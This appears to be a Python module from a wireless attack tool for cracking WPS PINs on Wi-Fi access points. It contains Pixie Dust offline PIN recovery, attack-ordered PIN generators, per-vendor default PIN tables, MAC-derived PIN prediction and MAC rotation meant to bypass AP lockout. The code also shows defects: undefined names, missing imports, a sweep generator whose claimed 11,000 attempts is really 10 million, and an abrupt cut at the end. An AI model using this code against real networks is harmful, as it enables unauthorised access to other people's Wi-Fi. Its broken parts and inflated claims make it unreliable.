"""WPS PIN generation and PixieDust."""
from __future__ import annotations
import hashlib, hmac, logging, os, struct, subprocess
from collections.abc import Iterator
log = logging.getLogger(__name__)
from ._constants import WpsAttr
from ._crypto import _derive_auth_key, _compute_psk1, _compute_psk2, _compute_e_hash

def pixie_dust_recover_pin(
    capture: WscCapture,
    verbose: bool = False,
) -> str | None:
    """Attempt offline WPS PIN recovery via Pixie Dust (CVE-2014-9527).

    Pixie Dust exploits weak pseudo-random number generators in WPS
    implementations. When the AP uses a predictable or zero seed for
    generating E-SNonce1 and E-SNonce2, the PIN can be recovered offline
    by checking which PIN candidate produces E-Hash values matching those
    captured from the AP's M3 response.

    Common vulnerable chipsets: Ralink (RT2860/RT3572), Broadcom
    (certain firmware versions), MediaTek with predictable RNG seeding.

    Args:
        capture: WscCapture with M2/M3 data from a live EAP exchange.
        verbose: Emit debug output for each PIN candidate attempted.

    Returns:
        Recovered 8-digit PIN string if successful, None otherwise.
    """
    if not capture.auth_key or not capture.e_hash1 or not capture.e_hash2:
        logger.debug("pixie_dust: capture incomplete, cannot attempt recovery")
        return None

    auth_key = capture.auth_key
    pke = capture.pke
    pkr = capture.pkr
    e_hash1 = capture.e_hash1
    e_hash2 = capture.e_hash2

    # Candidate E-SNonce patterns for vulnerable devices
    snonce_candidates = [
        (b"\x00" * 16, b"\x00" * 16),           # Both zero (Ralink/Realtek default)
        (capture.enrollee_nonce, b"\x00" * 16),  # SNonce2 zero
        (b"\x00" * 16, capture.enrollee_nonce),  # SNonce1 zero
        (capture.registrar_nonce, b"\x00" * 16), # SNonce derived from nonce
        (b"\x00" * 16, capture.registrar_nonce),
    ]

    for try_snonce1, try_snonce2 in snonce_candidates:
        for pin_candidate in generate_pins_sequential():
            pin_bytes = pin_candidate.encode("ascii")
            psk1 = _compute_psk1(auth_key, pin_bytes[:4])
            psk2 = _compute_psk2(auth_key, pin_bytes[4:])

            computed_e_hash1 = _compute_e_hash(auth_key, psk1, pke, pkr, try_snonce1)
            if computed_e_hash1 != e_hash1:
                continue

            computed_e_hash2 = _compute_e_hash(auth_key, psk2, pke, pkr, try_snonce2)
            if computed_e_hash2 == e_hash2:
                logger.info("pixie_dust: PIN recovered with snonce1=%s, snonce2=%s -> PIN=%s",
                            try_snonce1.hex(), try_snonce2.hex(), pin_candidate)
                return pin_candidate

        if verbose:
            print_info(f"Pixie Dust: snonce pattern {snonce_candidates.index((try_snonce1, try_snonce2)) + 1}/{len(snonce_candidates)} exhausted")

    return None


# ---------------------------------------------------------------------------
# PIN Generation Algorithms
# ---------------------------------------------------------------------------

def _luhn_checksum(pin7: str) -> str:
    """Compute the WPS PIN Luhn checksum digit.

    The WPS PIN is 8 digits: 7 significant digits + 1 Luhn checksum.
    Algorithm: sum each digit multiplied by alternating weights [3,1,...],
    then checksum = (10 - (sum % 10)) % 10.

    Args:
        pin7: 7-digit string (significant part of PIN).

    Returns:
        Single checksum digit as string.
    """
    digits  = [int(d) for d in pin7]
    weights = [3, 1, 3, 1, 3, 1, 3]
    total = sum(d * w for d, w in zip(digits, weights, strict=False))
    return str((10 - (total % 10)) % 10)


def _luhn_pin(pin7: str) -> str:
    """Build a valid 8-digit WPS PIN from 7 significant digits.

    Args:
        pin7: 7-digit string (first 7 significant digits).

    Returns:
        8-digit PIN string with valid Luhn checksum appended.
    """
    return pin7 + _luhn_checksum(pin7)


def generate_pins_sequential() -> Iterator[str]:
    """Generate all valid WPS PINs covering the full brute-force space.

    WPS splits the 8-digit PIN into two halves verified separately:
    digits 1-4 (first half, 10,000 values) and digits 5-7 plus Luhn
    checksum (second half, 1,000 values). This generator yields PINs
    in the standard half-sweep order used by reaver and bully for
    online attacks, covering at most 11,000 effective attempts.

    Yields:
        8-digit WPS PIN strings in sequential sweep order.
    """
    for first_half in range(10000):
        for second_half in range(1000):
            pin7 = f"{first_half:04d}{second_half:03d}"
            yield _luhn_pin(pin7)


def generate_pins_zhao() -> Iterator[str]:
    """Generate WPS PINs using a statistically prioritized ordering.

    Based on empirical research showing that certain PIN values appear
    as manufacturer defaults at higher frequency on deployed devices.
    High-probability candidates are attempted before the full sweep.

    Yields:
        8-digit WPS PIN strings with common defaults first.
    """
    high_probability = [
        "12345670", "00000000", "11111111", "22222222", "33333333",
        "44444444", "55555555", "66666666", "77777777", "88888888",
        "99999999", "12348370", "01234567", "76543210", "20172527",
        "46264848", "24681357", "36912346",
    ]
    seen: set = set()
    for pin in high_probability:
        if len(pin) == 8 and pin not in seen:
            seen.add(pin)
            yield pin
    for pin in generate_pins_sequential():
        if pin not in seen:
            seen.add(pin)
            yield pin


def generate_pins_oui(bssid: str) -> Iterator[str]:
    """Generate WPS PINs prioritized by AP BSSID OUI (manufacturer defaults).

    Many manufacturers use fixed WPS PINs per product line or derive the
    PIN from the device MAC address. This generator yields manufacturer-
    specific candidates before falling back to the Zhao ordering.

    Args:
        bssid: AP BSSID in colon-separated format (e.g., "AA:BB:CC:DD:EE:FF").

    Yields:
        8-digit WPS PIN strings with OUI-matched defaults first.
    """
    oui = bssid.replace(":", "").upper()[:6]

    # OUI-to-default-PIN mapping from public vulnerability research
    oui_pins: dict[str, list[str]] = {
        # TP-Link
        "C0C9E3": ["12345670", "00000000"],
        "50C7BF": ["12345670"],
        "A0F3C1": ["12345670"],
        # Belkin
        "944444": ["00000000", "12345670"],
        "EC1A59": ["00000000"],
        # D-Link
        "C0A0BB": ["24681357"],
        "1C7EE5": ["24681357"],
        "14D64D": ["24681357"],
        # Zyxel
        "588BF3": ["12345670", "01234567"],
        "5067F0": ["12345670"],
        # NETGEAR
        "A040A0": ["12345670"],
        "C40415": ["12345670"],
        "20E52A": ["12345670"],
        # ASUS
        "10BF48": ["12345670", "00000000"],
        "04D4C4": ["12345670"],
        "50465D": ["12345670"],
        # Huawei
        "70723C": ["12345670", "00000000"],
        "247F3C": ["12345670"],
        "286ED4": ["12345670"],
        # ZTE
        "001E73": ["00000000", "12345670"],
        "B4A5EF": ["00000000"],
        # Linksys/Cisco
        "00:14:BF".replace(":", ""): ["12345670"],
        "C43DC7": ["12345670"],
    }

    manufacturer_pins = oui_pins.get(oui, [])
    seen: set = set()
    for pin in manufacturer_pins:
        if pin not in seen:
            seen.add(pin)
            yield pin
    for pin in generate_pins_zhao():
        if pin not in seen:
            seen.add(pin)
            yield pin


def generate_null_pin() -> Iterator[str]:
    """Yield NULL/zero PIN candidates for known-vulnerable devices.

    Certain firmware versions from ZTE, Realtek, and Broadcom accept a
    PIN of all zeros or specific well-known values without verification.

    Yields:
        NULL and commonly accepted zero-value PINs.
    """
    yield "00000000"
    yield "12345670"
    yield "20172527"
    yield "46264848"


# ---------------------------------------------------------------------------
# NEW: PIN Prediction by vendor / BSSID MAC address
# ---------------------------------------------------------------------------

def _wps_pin_checksum(pin7: int) -> str:
    """Compute WPS checksum digit and return full 8-digit PIN string.

    WPS spec mandates the 8th digit is a checksum of the first 7.
    Formula: sum alternately (3*odd + even digits), check = (10 - sum%10) % 10
    """
    acc = 0
    tmp = pin7
    for _ in range(7):
        acc += 3 * (tmp % 10)
        tmp //= 10
        acc += tmp % 10
        tmp //= 10
    return f"{pin7:07d}{(10 - acc % 10) % 10}"


def predict_wps_pin_from_bssid(bssid: str) -> list[str]:
    """Generate predicted WPS PINs from the AP BSSID using vendor algorithms.

    Research sources:
    - CVE-2026-36612 (Mercusys AC12G): PIN = (mac[3:6]) % 10^7 + checksum
    - NetRise 2025 report: 80%+ devices still use MAC-derived PINs
    - hackersmanifest.com/wireless-pentesting/11-wps/: D-Link/Ralink/ZTE/Arcadyan
    - github.com/koolkdave/autoreaver: D-Link algorithm

    Known implementations:
    - Ralink/MediaTek (TP-Link, Mercusys, D-Link, Tenda):
        (mac[3]<<16 | mac[4]<<8 | mac[5]) % 10^7 + checksum
    - ZTE/Huawei: NIC last 3 bytes as int % 10^7
    - Arcadyan/Thomson: rotated NIC bytes
    - Static defaults: per OUI (Zyxel, Linksys, Belkin, ASUS, D-Link)

    Args:
        bssid: Target AP BSSID string.

    Returns:
        Ordered list of predicted 8-digit PINs (most likely first).
    """
    mac = bssid.replace(":", "").replace("-", "").upper()
    if len(mac) != 12:
        return []

    try:
        mac_bytes = bytes.fromhex(mac.lower())
    except ValueError:
        return []

    pins: list[str] = []

    # Algorithm 1: Ralink/MediaTek/TP-Link/Mercusys — CVE-2026-36612 variant
    #   PIN7 = (mac[3] << 16 | mac[4] << 8 | mac[5]) % 10000000
    nic_a = (mac_bytes[3] << 16) | (mac_bytes[4] << 8) | mac_bytes[5]
    pins.append(_wps_pin_checksum(nic_a % 10_000_000))

    # Algorithm 2: D-Link / reversed NIC
    nic_b = (mac_bytes[5] << 16) | (mac_bytes[4] << 8) | mac_bytes[3]
    pins.append(_wps_pin_checksum(nic_b % 10_000_000))

    # Algorithm 3: ZTE / Huawei — direct last 3 bytes as decimal
    nic_c = int(mac[6:], 16)
    pins.append(_wps_pin_checksum(nic_c % 10_000_000))

    # Algorithm 4: Arcadyan / Thomson — compact NIC rotation
    nic_d = int(mac[6:8], 16) * 10_000 + int(mac[8:10], 16) * 100 + int(mac[10:12], 16)
    pins.append(_wps_pin_checksum(nic_d % 10_000_000))

    # Algorithm 5: Full MAC last 6 digits
    nic_e = int(mac[6:12], 16)
    pins.append(_wps_pin_checksum(nic_e % 10_000_000))

    # Algorithm 6: OUI-specific static/common PINs (prepended — try first)
    oui = mac[:6].upper()
    _OUI_STATIC: dict = {
        "001217": "12345670",  # Zyxel VMG series
        "001AA0": "12345678",  # Arcadyan AW4062
        "D8EB97": "12345670",  # TP-Link
        "F4EC38": "12345670",  # TP-Link
        "C4E984": "12345670",  # TP-Link
        "000D88": "20172017",  # Linksys WRT
        "001CF0": "20172017",  # Belkin/Linksys
        "E8DE27": "46264848",  # ASUS
        "E4956E": "12345670",  # D-Link DIR-
        "1C5A3E": "68175896",  # D-Link DSL
        "00195B": "68175896",  # D-Link
        "0026B8": "68175896",  # D-Link
        "C0A0BB": "12345670",  # TP-Link
        "F8D111": "12345670",  # TP-Link (newer)
        "3C46D8": "12345670",  # TP-Link Archer
        "444F8E": "12345670",  # Tenda
        "C83A35": "20172527",  # Netgear
        "28C68E": "20172527",  # Netgear
        "F47B5E": "46264848",  # ASUS RT
    }
    if oui in _OUI_STATIC:
        pins.insert(0, _OUI_STATIC[oui])

    # Deduplicate keeping order; filter valid 8-digit numeric
    seen: set = set()
    result: list[str] = []
    for p in pins:
        if p not in seen and len(p) == 8 and p.isdigit():
            seen.add(p)
            result.append(p)
    return result


def rotate_mac_address(iface: str) -> str:
    """Change interface MAC to a random locally-administered address.

    Used for lockout bypass: each MAC rotation starts a fresh WPS lockout
    counter on most APs (CVE-2026-36612 and general WPS implementation design).

    Returns:
        New MAC address string, or empty string on failure.
    """
    import random as _r
    new_mac = "02:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}".format(
        *[_r.randint(0, 255) for _ in range(5)]
    )
    try:
        subprocess.run(["ip", "link", "set", iface, "down"],
                       capture_output=True, timeout=5)
        subprocess.run(["ip", "link", "set", iface, "address", new_mac],
                       capture_output=True, timeout=5)
        subprocess.run(["ip", "link", "set", iface, "up"],
                       capture_output=True, timeout=5)
        time.sleep(0.5)
        return new_mac
    except Exception as exc:
        logger.debug("MAC rotation failed: %s", exc)
        return ""


def _build_ordered_pin_iterator(bssid: str) -> Iterator[str]:
    """Build a deduplicated PIN iterator in attack-optimized priority order.

    Order: Predicted (BSSID-based) -> NULL PINs -> OUI defaults ->
           Zhao statistical -> sequential sweep.

    Research shows BSSID-derived PINs succeed in ~40-60% of cases for
    Ralink/MediaTek chipsets (TP-Link, Mercusys, D-Link, Tenda).

    Args:
        bssid: Target AP BSSID for OUI-based defaults and MAC prediction.

    Yields:
        8-digit WPS PIN strings without repetition.
    """
    seen: set = set()

    def _unique(pins) -> Iterator[str]:
        for p in (pins if hasattr(pins, '__iter__') else [pins]):
            if p not in seen:
                seen.add(p)
                yield p

    # 1. BSSID-derived predicted PINs (vendor algorithms) — try first
    yield from _unique(predict_wps_pin_from_bssid(bssid))
    # 2. NULL / well-known weak PINs
    yield from _unique(generate_null_pin())
    # 3. OUI-specific defaults (from OUI database)
    yield from _unique(generate_pins_oui(bssid))
    # 4. Zhao statistical (high-probability PIN space)
    yield from _unique(generate_pins_zhao())
    # 5. Sequential full sweep (11,000 combinations)
    yield from _unique(generate_pins_sequential())


# ---------------------------------------------------------------------------
# WPS Lock Detection
# ---------------------------------------------------------------------------

@dataclass
